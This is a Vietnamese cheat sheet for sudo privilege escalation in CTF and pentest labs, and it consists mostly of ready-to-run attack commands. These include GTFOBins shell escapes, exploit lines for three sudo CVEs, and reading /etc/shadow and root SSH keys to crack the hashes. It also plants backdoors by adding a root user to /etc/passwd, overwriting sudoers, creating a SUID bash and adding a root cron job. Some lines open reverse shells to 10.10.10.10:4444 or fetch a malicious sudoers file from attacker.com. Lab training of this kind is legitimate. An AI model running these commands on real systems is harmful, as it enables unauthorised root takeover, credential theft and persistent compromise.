# 🔐 SUDO Cheat Sheet — CTF & Privilege Escalation

> **Mục đích:** Tham khảo nhanh cho CTF, pentest lab (HTB/THM). Chỉ dùng trên hệ thống bạn được phép kiểm thử.

---

## 📚 1. Cú pháp cơ bản (`man sudo`)

```bash
sudo [OPTIONS] COMMAND

sudo -l                        # Liệt kê quyền sudo của user hiện tại
sudo -u <user> COMMAND         # Chạy lệnh với tư cách user khác
sudo -s                        # Mở shell với quyền root (dùng $SHELL)
sudo -i                        # Login shell của root (load /root/.bashrc)
sudo su -                      # Switch sang root shell đầy đủ
sudo -b COMMAND                # Chạy command ở background
sudo -e /etc/file              # Edit file với sudoedit (an toàn hơn sudo nano)
sudo -v                        # Renew sudo timestamp (không chạy lệnh)
sudo -k                        # Hủy timestamp sudo ngay lập tức
sudo -n COMMAND                # Non-interactive (lỗi nếu cần password)
sudo -A COMMAND                # Dùng ASKPASS program
sudo !!                        # Chạy lại lệnh vừa rồi với sudo
```

### `/etc/sudoers` — Hiểu cấu trúc

```
# WHO       WHERE=(AS_WHOM)   COMMAND
root        ALL=(ALL:ALL)      ALL
www-data    ALL=(ALL)          NOPASSWD: /usr/bin/python3
john        ALL=(root)         /usr/bin/find, /usr/bin/less
%sudo       ALL=(ALL:ALL)      ALL        # Group sudo
```

|Token|Ý nghĩa|
|---|---|
|`ALL`|Tất cả host / user / lệnh|
|`NOPASSWD:`|Không cần nhập password|
|`!command`|Bị cấm dùng lệnh này|
|`(ALL:ALL)`|Chạy với tư cách bất kỳ user:group|

---

## 🔍 2. Enumeration — Bước đầu tiên luôn làm

```bash
# === Kiểm tra sudo rights ===
sudo -l
sudo -l -U username           # Kiểm tra user khác (cần quyền)

# === Tìm file sudoers ===
cat /etc/sudoers
cat /etc/sudoers.d/*
ls -la /etc/sudoers.d/

# === Xem sudo version (check CVE) ===
sudo --version
sudoedit --version

# === Xem ai trong group sudo/wheel ===
getent group sudo
getent group wheel
cat /etc/group | grep -E 'sudo|wheel|admin'

# === Lịch sử sudo ===
cat /var/log/auth.log | grep sudo
cat /var/log/secure | grep sudo        # RHEL/CentOS
journalctl | grep sudo
```

---

## 💥 3. GTFOBins — Khai thác phổ biến nhất (CTF Must-Know)

> **Rule:** Nếu binary nào có thể chạy với `sudo`, tra ngay [gtfobins.github.io](https://gtfobins.github.io/)

### 🐚 Shell Escape — Các binary hay gặp nhất

```bash
# === find ===
sudo find . -exec /bin/bash \; -quit
sudo find /etc/passwd -exec /bin/sh \;

# === vim / vi / nano ===
sudo vim -c ':!/bin/bash'
sudo vim -c ':set shell=/bin/bash' -c ':shell'
sudo nano          # Ctrl+R, Ctrl+X, gõ: reset; bash 1>&0 2>&0

# === less / more ===
sudo less /etc/passwd     # Bên trong gõ: !/bin/bash

# === man ===
sudo man man              # Bên trong gõ: !/bin/bash

# === python / python3 ===
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo python -c 'import pty; pty.spawn("/bin/bash")'

# === perl ===
sudo perl -e 'exec "/bin/bash";'

# === ruby ===
sudo ruby -e 'exec "/bin/bash"'

# === lua ===
sudo lua -e 'os.execute("/bin/bash")'

# === awk / gawk ===
sudo awk 'BEGIN {system("/bin/bash")}'

# === nmap (old versions) ===
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# === nmap interactive (< v5.35DC1) ===
sudo nmap --interactive
nmap> !sh

# === wget ===
sudo wget -O /etc/sudoers http://attacker.com/sudoers_evil

# === curl ===
sudo curl file:///etc/shadow -o /tmp/shadow_copy

# === tee ===
echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers

# === cp ===
sudo cp /bin/bash /tmp/rootbash
sudo chmod +s /tmp/rootbash
/tmp/rootbash -p

# === chmod / chown ===
sudo chmod +s /bin/bash
/bin/bash -p                  # Khai thác SUID bash

# === dd ===
echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo dd of=/etc/sudoers

# === cat ===
# Đọc file nhạy cảm
sudo cat /etc/shadow
sudo cat /root/.ssh/id_rsa
sudo cat /root/root.txt

# === tail / head ===
sudo tail /etc/shadow
sudo head -n 999 /etc/shadow

# === tar ===
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# === zip ===
sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"

# === git ===
sudo git help config           # Bên trong gõ: !/bin/bash
sudo git -p help               # Gõ: !/bin/bash

# === ftp ===
sudo ftp                       # Bên trong gõ: !/bin/bash

# === tcpdump ===
echo $'id\n/bin/bash' > /tmp/x.sh
chmod +x /tmp/x.sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x.sh

# === env ===
sudo env /bin/bash

# === strace ===
sudo strace -o /dev/null /bin/bash

# === LD_PRELOAD (nếu env_keep có LD_PRELOAD) ===
# Tạo /tmp/shell.c:
# #include <stdio.h>
# #include <stdlib.h>
# void _init() { setuid(0); system("/bin/bash -i"); }
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>
```

---

## ⚡ 4. Sudo CVEs — Luôn kiểm tra version

### CVE-2021-3156 — Baron Samedit (sudo < 1.9.5p2)

```bash
sudo --version                 # Kiểm tra version

# Exploit PoC (buffer overflow trong sudoedit)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')

# Tool tự động:
# https://github.com/blasty/CVE-2021-3156
python3 exploit.py
```

### CVE-2019-14287 — Sudo < 1.8.28

```bash
# Nếu sudoers có: user ALL=(ALL, !root) NOPASSWD: /bin/bash
# Bypass bằng UID -1 hoặc 4294967295
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

### CVE-2019-18634 — pwfeedback Buffer Overflow (sudo < 1.8.31)

```bash
# Khi /etc/sudoers có: Defaults pwfeedback
python3 -c "print('A'*512)" | sudo -S -p '' id
```

---

## 🎯 5. Sudo với User Khác (Lateral Movement)

```bash
# Nếu có quyền: (www-data) NOPASSWD: ALL
sudo -u www-data /bin/bash
sudo -u www-data id

# Nếu có quyền: (ALL : ALL) NOPASSWD: ALL
sudo -u#0 /bin/bash            # Direct root
sudo -g root /bin/bash         # Dùng group root

# Chạy script từ context user khác
sudo -u postgres psql
# Trong psql: \! /bin/bash

sudo -u git /home/git/git-shell  # Gitea/Gogs abuse
```

---

## 📁 6. File Reads Quan Trọng Khi Có Sudo

```bash
# === Credentials ===
sudo cat /etc/shadow                    # Password hashes
sudo cat /etc/passwd                    # User list
sudo cat /root/.bash_history            # History root
sudo cat /root/.ssh/id_rsa              # SSH key của root
sudo cat /root/.ssh/authorized_keys

# === Config files chứa password ===
sudo cat /etc/mysql/debian.cnf
sudo cat /var/www/html/config.php
sudo cat /opt/*/config*
sudo cat /home/*/.ssh/id_rsa
sudo find / -name "*.conf" 2>/dev/null | sudo xargs grep -l "password"

# === Database ===
sudo cat /var/lib/mysql/mysql/user.MYD  # MySQL passwords
sudo sqlite3 /path/to/db.sqlite3 ".dump"

# === Crack shadow hash ===
sudo cat /etc/shadow > /tmp/shadow
hashcat -m 1800 /tmp/shadow /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow
```

---

## 🛠️ 7. Sudo Write — Ghi đè file hệ thống

```bash
# === Thêm user root mới vào /etc/passwd ===
# Tạo password hash trước:
openssl passwd -1 -salt xyz hacked123
# Kết quả: $1$xyz$...hash...

echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su hacker  # password: hacked123

# === Ghi đè /etc/sudoers ===
echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers

# === Tạo SUID shell ===
sudo cp /bin/bash /tmp/rootbash
sudo chmod 4755 /tmp/rootbash
/tmp/rootbash -p    # -p giữ effective UID

# === Thêm SSH key vào root ===
sudo mkdir -p /root/.ssh
echo 'ssh-rsa AAAA...your_key...' | sudo tee -a /root/.ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys
ssh root@localhost

# === Cron job root ===
sudo tee /etc/cron.d/pwn << 'EOF'
* * * * * root chmod +s /bin/bash
EOF
# Đợi 1 phút rồi: /bin/bash -p
```

---

## 🔄 8. Sudo + Script / Service Abuse

```bash
# === Nếu được sudo chạy script do mình control ===
sudo /opt/scripts/backup.sh
# Edit script trước:
echo '/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /opt/scripts/backup.sh

# === Wildcard injection (tar, rsync) ===
# Nếu sudoers: (root) NOPASSWD: /usr/bin/tar * /backup
cd /tmp
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > shell.sh
chmod +x shell.sh
sudo tar czf /backup/x.tgz /tmp/*     # Wildcard expand

# === Sudo + rsync wildcard ===
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

---

## 🌐 9. Sudo Path Hijacking

```bash
# Nếu sudoers dùng relative path: (root) NOPASSWD: python script.py
# Và env_reset KHÔNG được set, hoặc secure_path không đủ

# Kiểm tra secure_path:
sudo -l | grep secure_path     # Nếu không có -> PATH hijack

# Tạo binary giả:
echo '/bin/bash' > /tmp/python
chmod +x /tmp/python
export PATH=/tmp:$PATH
sudo python script.py          # Chạy /tmp/python thay vì /usr/bin/python
```

---

## 🏆 10. CTF Common Patterns (IPPSec Style)

```bash
# === Pattern 1: NOPASSWD binary thường gặp ===
sudo -l
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# === Pattern 2: Custom script ===
sudo -l
# (root) NOPASSWD: /opt/monitor.py
cat /opt/monitor.py             # Đọc source
# Nếu import thư viện -> Python Library Hijack
echo 'import os; os.system("/bin/bash")' > /tmp/os.py
cd /tmp && sudo python3 /opt/monitor.py

# === Pattern 3: Sudo với env_keep ===
# Defaults env_keep += "PYTHONPATH"
export PYTHONPATH=/tmp
# Tạo /tmp/module_name.py với payload

# === Pattern 4: Restricted shell bypass ===
sudo -l
# (root) NOPASSWD: /usr/bin/git
sudo git help config
# !/bin/bash (bên trong pager)

# === Pattern 5: Sudo version exploit ===
sudo --version | head -1
# Sudo version 1.8.27 -> CVE-2019-14287

# === Pattern 6: Service restart ===
sudo -l
# (root) NOPASSWD: /usr/sbin/service nginx restart
# Nếu nginx.conf do mình control:
echo 'user root;' > /etc/nginx/nginx.conf
# Nginx chạy với quyền root

# === Pattern 7: Environment Variables ===
sudo -l | grep env_keep
# env_keep += "LD_PRELOAD"
# -> Compile shared library, inject
```

---

## 📋 11. Quick Reference — Decision Tree

```
sudo -l
    │
    ├── NOPASSWD: /bin/bash, /bin/sh, /usr/bin/python*, /usr/bin/perl...
    │       └── GTFOBins ngay → Shell escape
    │
    ├── NOPASSWD: /usr/bin/vim, /usr/bin/less, /usr/bin/man, /usr/bin/more...
    │       └── Pager escape → !/bin/bash
    │
    ├── NOPASSWD: /usr/bin/find, /usr/bin/awk, /usr/bin/tee...
    │       └── GTFOBins command injection
    │
    ├── NOPASSWD: custom_script.py / .sh
    │       └── Đọc source → Tìm imports, wildcards, path issues
    │
    ├── sudo version < 1.8.28
    │       └── CVE-2019-14287: sudo -u#-1 /bin/bash
    │
    ├── sudo version < 1.9.5p2
    │       └── CVE-2021-3156: Baron Samedit BoF
    │
    └── env_keep có LD_PRELOAD / PYTHONPATH
            └── Library/Shared object injection
```

---

## 🔗 12. Resources

|Resource|Link|
|---|---|
|GTFOBins|https://gtfobins.github.io|
|HackTricks Sudo|https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid|
|CVE-2021-3156 PoC|https://github.com/blasty/CVE-2021-3156|
|LinPEAS (auto enum)|https://github.com/carlospolop/PEASS-ng|
|Sudo man page|`man sudoers` / `man sudo`|

---

> 💡 **IPPSec Tip:** Luôn chạy `sudo -l` ngay sau khi có shell. Kết hợp với `find / -perm -4000 2>/dev/null` (SUID) và `cat /etc/crontab` là bộ 3 enumeration cơ bản nhất của mọi box.